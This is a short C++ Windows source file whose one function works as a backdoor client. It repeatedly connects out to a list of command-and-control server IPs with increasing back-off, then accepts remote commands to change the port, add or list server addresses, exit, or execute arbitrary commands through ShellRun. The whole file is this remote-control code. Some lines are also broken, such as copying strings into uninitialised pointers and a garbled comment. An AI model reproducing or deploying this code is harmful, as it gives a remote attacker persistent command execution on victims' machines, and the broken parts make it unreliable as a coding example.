#include <WS2tcpip.h>
#pragma  comment(lib,"ws2_32.lib")
#include"main.h"
int ConnectServer(list<char *> ips, int port)
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return -1;
	}
	sockaddr_in serAddr;
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(port);
	SOCKET sclient;
	list<char *>::iterator ir;
	while (true)
	{
		sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		unsigned int sleepNum = 0, times = 0;
		for (ir = ips.begin(); ir != ips.end(); ir++)
		{
			inet_pton(AF_INET, *ir, (void*)&serAddr.sin_addr);
			if (sclient == INVALID_SOCKET || connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
			{
				if (++times >= ips.size())
				{
					times = 1;
					ir = ips.begin();
					Sleep(60000 * ++sleepNum);
					if (sleepNum > 10)
					{
						sleepNum = 10;
					}
					continue;
				}
				continue;
			}
			else
			{
				break;
			}
		}
		while (true)
		{
			char recData[255] = "";
			int ret = recv(sclient, recData, 255, 0);
			if (ret > 0)
			{
				//∑÷∏Ó÷∏¡Ó
				const char *d = ",";
				char *p, *q;
				StrCpy(q, recData);
				p = strtok_s(q, d, &q);

				if (strcmp(p, "exit") == 0)
				{
					return 1;
				}
				else if (strcmp(p, "port") == 0)
				{
					serAddr.sin_port = htons(atoi(q));
					break;
				}
				else if (strcmp(p, "addip") == 0)
				{
					char* str;
					StrCpy(str, q);
					ips.push_front(str);
					break;
				}
				else if (strcmp(p, "chkip") == 0)
				{
					for (ir = ips.begin(); ir != ips.end(); ir++)
					{
						send(sclient, *ir, strlen(*ir), 0);
						send(sclient, "&", 1, 0);
					}
				}
				else
				{
					if (ShellRun(p, q, 1))
						send(sclient, recData, strlen(recData), 0);
				}
				recData[ret] = 0x00;
			}
			else
			{
				break;
			}
		}
		closesocket(sclient);
	}
	closesocket(sclient);
	WSACleanup();
}